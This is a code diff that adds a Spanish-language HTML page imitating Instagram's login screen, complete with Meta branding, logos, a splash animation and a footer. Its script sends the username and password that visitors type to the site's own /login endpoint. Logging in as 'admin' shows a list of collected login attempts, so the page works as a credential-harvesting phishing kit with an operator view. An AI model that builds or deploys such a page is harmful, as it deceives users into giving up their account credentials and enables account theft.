@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Instagram</title>
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+<style>
+:root{
+  --bg:#0b141a;
+  --panel:#0f1c24;
+  --border:#26323a;
+  --text:#e7edf2;
+  --muted:#9fb0bf;
+  --blue:#1d9bf0;
+}
+
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--text);
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
+}
+
+/* -------- SPLASH -------- */
+#splash{
+  position:fixed;
+  inset:0;
+  background:#0b141a;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  z-index:10;
+}
+
+#splash img{
+  width:72px;
+  animation:pulse 1.5s infinite;
+}
+
+@keyframes pulse{
+  0%{transform:scale(1);opacity:.7}
+  50%{transform:scale(1.08);opacity:1}
+  100%{transform:scale(1);opacity:.7}
+}
+
+.splash-meta{
+  position:absolute;
+  bottom:30px;
+  font-size:14px;
+  color:#a8b6c3;
+}
+
+/* -------- LOGIN -------- */
+#login{
+  display:none;
+  min-height:100vh;
+}
+
+.wrapper{
+  display:flex;
+  justify-content:center;
+}
+
+.card-login{
+  width:100%;
+  max-width:420px;
+  padding:26px 18px;
+}
+
+.logo{
+  display:flex;
+  justify-content:center;
+  margin:18px 0 26px;
+}
+
+.logo img{
+  width:44px;
+}
+
+h1{
+  font-size:18px;
+  font-weight:600;
+  margin-bottom:18px;
+}
+
+.input{
+  width:100%;
+  background:transparent;
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:14px 16px;
+  color:var(--text);
+  margin-bottom:14px;
+  font-size:15px;
+}
+
+.input::placeholder{
+  color:var(--muted);
+}
+
+.btn-main{
+  width:100%;
+  border:none;
+  border-radius:999px;
+  padding:12px;
+  background:#1d9bf0;
+  color:#fff;
+  font-weight:600;
+  margin-top:8px;
+  box-shadow: 0 2px 8px rgba(29,155,240,0.15);
+  transition: background 0.2s, color 0.2s, box-shadow 0.2s;
+}
+.btn-main:hover, .btn-main:focus {
+  background:#0b5cab;
+  color:#fff;
+  box-shadow: 0 4px 16px rgba(29,155,240,0.25);
+  cursor:pointer;
+}
+
+
+.link{
+  text-align:center;
+  margin:18px 0;
+  color:#d7e6f3;
+  font-size:14px;
+}
+
+.btn-fb{
+  width:100%;
+  background:transparent;
+  border:1px solid var(--border);
+  color:#d7e6f3;
+  border-radius:999px;
+  padding:12px;
+  font-weight:600;
+}
+
+.btn-create{
+  width:100%;
+  background:transparent;
+  border:1px solid var(--blue);
+  color:var(--blue);
+  border-radius:999px;
+  padding:12px;
+  margin-top:18px;
+  font-weight:600;
+}
+
+.meta{
+  text-align:center;
+  margin-top:26px;
+  color:#a8b6c3;
+  font-size:13px;
+}
+
+.footer{
+  text-align:center;
+  font-size:12px;
+  color:#8fa1b3;
+  margin-bottom:14px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- SPLASH -->
+<div id="splash">
+  <img src="/static/Instagram-removebg-preview.png" alt="Instagram">
+  <div class="splash-meta">from <strong>Meta</strong></div>
+</div>
+
+<!-- LOGIN -->
+<div id="login">
+  <div class="wrapper">
+    <div class="card-login">
+
+      <div class="logo">
+        <img src="/static/Instagram-removebg-preview.png" alt="Instagram">
+      </div>
+
+      <h1>Iniciar sesión en Instagram</h1>
+
+      <input class="input" id="userInput" placeholder="Número de móvil, nombre de usuario o correo electrónico">
+      <input class="input" id="passInput" type="password" placeholder="Contraseña">
+
+      <button class="btn-main" id="loginBtn">Iniciar sesión</button>
+
+      <div class="link">¿Has olvidado la contraseña?</div>
+
+      <button class="btn-fb"><img src="/static/facebook.png" alt="Facebook" style="height:20px;vertical-align:middle;margin-right:8px;">Iniciar sesión con Facebook</button>
+
+      <button class="btn-create">Crear una cuenta</button>
+
+      <div class="meta"><img src="/static/Meta.svg" alt="Meta" style="height:18px;vertical-align:middle;margin-right:6px;">Meta</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    Meta · Información · Blog · Empleo · Ayuda · API · Privacidad
+  </div>
+</div>
+
+<script>
+setTimeout(() => {
+  document.getElementById("splash").style.display = "none";
+  document.getElementById("login").style.display = "block";
+}, 2000); // tiempo de carga
+
+// Login logic
+const baseUrl = window.location.origin;
+document.getElementById("loginBtn").addEventListener("click", function() {
+  const user = document.getElementById("userInput").value;
+  const pass = document.getElementById("passInput").value;
+  fetch(baseUrl + "/login", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ user: user, password: pass })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.status === "success" && user.trim().toLowerCase() === "admin") {
+      fetch(baseUrl + "/admin/attempts")
+        .then(resp => resp.json())
+        .then(attemptsData => {
+          document.body.innerHTML = `<pre style='background:#0b141a;color:#e7edf2;font-size:16px;padding:24px;'>${JSON.stringify(attemptsData, null, 2)}</pre>`;
+        });
+    } else if (data.status === "success") {
+      document.body.innerHTML = `<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#0b141a;color:#e7edf2;font-size:18px;'>`
+        + `<div><strong>Usuario:</strong> ${data.user}</div>`
+        + `<div><strong>Contraseña:</strong> ${data.password}</div>`
+        + `</div>`;
+    } else {
+      alert("Usuario o contraseña incorrectos.");
+    }
+  })
+  .catch(() => {
+    alert("Error de conexión con el servidor.");
+  });
+});
+</script>
+
+</body>
+</html>
